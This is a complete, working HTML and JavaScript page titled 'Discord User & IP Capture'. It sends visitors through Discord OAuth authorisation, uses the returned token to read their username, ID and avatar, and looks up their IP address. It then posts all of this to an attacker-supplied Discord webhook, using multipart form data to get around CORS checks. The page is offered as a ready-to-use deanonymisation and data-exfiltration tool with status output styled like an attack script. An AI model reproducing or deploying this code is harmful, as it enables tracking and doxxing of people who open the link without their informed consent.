<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord User & IP Capture</title>
    <style>
        body {
            background-color: #0d1117;
            color: #c9d1d9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 24px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
        }
        h2 {
            margin-top: 0;
            font-size: 20px;
            text-align: center;
            color: #f0f6fc;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            font-size: 14px;
            font-weight: 500;
        }
        input[type="text"] {
            width: 100%;
            box-sizing: border-box;
            padding: 10px;
            background-color: #0d1117;
            border: 1px solid #30363d;
            border-radius: 4px;
            color: #c9d1d9;
            font-family: monospace;
        }
        input:focus {
            border-color: #58a6ff;
            outline: none;
        }
        button {
            background-color: #5865F2;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            padding: 12px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
        }
        button:hover {
            background-color: #4752C4;
        }
        .status {
            margin-top: 16px;
            font-size: 14px;
            font-family: monospace;
            white-space: pre-wrap;
            padding: 12px;
            border-radius: 4px;
            background-color: #0d1117;
            border: 1px solid #30363d;
            display: none;
        }
        .success { color: #3fb950; border-color: #3fb950; }
        .error { color: #f85149; border-color: #f85149; }
        .info { color: #58a6ff; border-color: #58a6ff; }
        .note {
            font-size: 12px;
            color: #8b949e;
            margin-top: 16px;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Discord User & IP Capture</h2>
        
        <div id="setup-ui">
            <div class="form-group">
                <label for="webhookUrl">Discord Webhook URL</label>
                <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." />
            </div>
            
            <div class="form-group">
                <label for="clientId">Discord OAuth2 Client ID</label>
                <input type="text" id="clientId" placeholder="Get from Discord Developer Portal" />
            </div>

            <div class="form-group">
                <label for="redirectUri">Redirect URI</label>
                <input type="text" id="redirectUri" readonly />
            </div>

            <button id="authBtn" onclick="initiateAuth()">Authorize & Capture</button>
            
            <div class="note">
                <strong>Requirement:</strong> Must be served via HTTP/HTTPS (e.g. <code>http://localhost:8000/</code>). Webhook dispatch relies on standard form payload delivery to pass CORS checks.
            </div>
        </div>

        <div id="status" class="status"></div>
    </div>

    <script>
        const currentUri = (window.location.origin === "null" || !window.location.origin)
            ? window.location.href.split('#')[0]
            : window.location.origin + window.location.pathname;
            
        document.getElementById('redirectUri').value = currentUri;

        if (localStorage.getItem('webhookUrl')) {
            document.getElementById('webhookUrl').value = localStorage.getItem('webhookUrl');
        }
        if (localStorage.getItem('clientId')) {
            document.getElementById('clientId').value = localStorage.getItem('clientId');
        }

        window.addEventListener('DOMContentLoaded', () => {
            const hash = window.location.hash.substring(1);
            if (!hash) return;

            const params = new URLSearchParams(hash);
            const accessToken = params.get('access_token');
            const state = params.get('state');

            if (accessToken && state) {
                document.getElementById('setup-ui').style.display = 'none';
                executeCapture(accessToken, decodeURIComponent(state));
            }
        });

        function initiateAuth() {
            const webhookUrl = document.getElementById('webhookUrl').value.trim();
            const clientId = document.getElementById('clientId').value.trim();
            const redirectUri = document.getElementById('redirectUri').value.trim();

            if (!webhookUrl || !clientId) {
                showStatus('Error: Webhook URL and Client ID are required.', 'error');
                return;
            }

            localStorage.setItem('webhookUrl', webhookUrl);
            localStorage.setItem('clientId', clientId);

            const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${encodeURIComponent(clientId)}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=identify&state=${encodeURIComponent(webhookUrl)}`;
            
            showStatus('[*] Redirecting to Discord authorization...', 'info');
            window.location.href = authUrl;
        }

        async function executeCapture(token, webhookUrl) {
            showStatus('[*] Exchanging token for Discord profile...', 'info');

            try {
                const userResponse = await fetch('https://discord.com/api/users/@me', {
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                
                if (!userResponse.ok) {
                    throw new Error(`Discord API status ${userResponse.status}`);
                }
                const userData = await userResponse.json();

                showStatus(`[*] Profile resolved: ${userData.username}\n[*] Fetching origin IP...`, 'info');
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;

                showStatus(`[*] Origin IP resolved: ${ipAddress}\n[*] Dispatching payload...`, 'info');
                
                const embed = {
                    title: "Telemetry Capture Result",
                    color: 5814783,
                    fields: [
                        { name: "Discord Username", value: `**${userData.username}**`, inline: true },
                        { name: "Discord ID", value: `\`${userData.id}\``, inline: true },
                        { name: "Origin IP", value: `\`${ipAddress}\``, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                };

                if (userData.avatar) {
                    embed.thumbnail = { url: `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` };
                }

                const payload = { embeds: [embed] };

                // Use multipart form data via fetch to bypass standard JSON preflight CORS block
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify(payload));

                const webhookResponse = await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                });

                if (!webhookResponse.ok) {
                    throw new Error(`Webhook dispatch failed: HTTP ${webhookResponse.status}`);
                }

                showStatus(`[+] Payload successfully dispatched.\n\nCaptured Account:\nUser: ${userData.username}\nID: ${userData.id}\nIP: ${ipAddress}`, 'success');
            } catch (err) {
                showStatus(`[-] Capture failed: ${err.message}`, 'error');
            } finally {
                history.replaceState("", document.title, window.location.pathname);
            }
        }

        function showStatus(text, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.style.display = 'block';
            statusDiv.textContent = text;
            statusDiv.className = `status ${type}`;
        }
    </script>
</body>
</html>
